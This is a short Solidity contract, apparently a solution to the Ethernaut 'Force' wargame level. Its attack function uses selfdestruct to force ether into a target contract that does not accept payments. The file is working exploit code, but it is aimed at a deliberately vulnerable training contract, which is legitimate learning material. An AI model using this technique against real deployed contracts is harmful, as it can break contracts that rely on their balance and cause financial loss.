//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../ethernautContracts/07_Force.sol";

import "hardhat/console.sol";

contract ForceAttack {

    Force public victimContract;

    constructor (address _victimContractAddr) {
        victimContract = Force(payable(_victimContractAddr));
    }

    function attack () public payable {
        require(msg.value > 0);
        address payable addr = payable(address(victimContract));
        selfdestruct(addr);

    }

}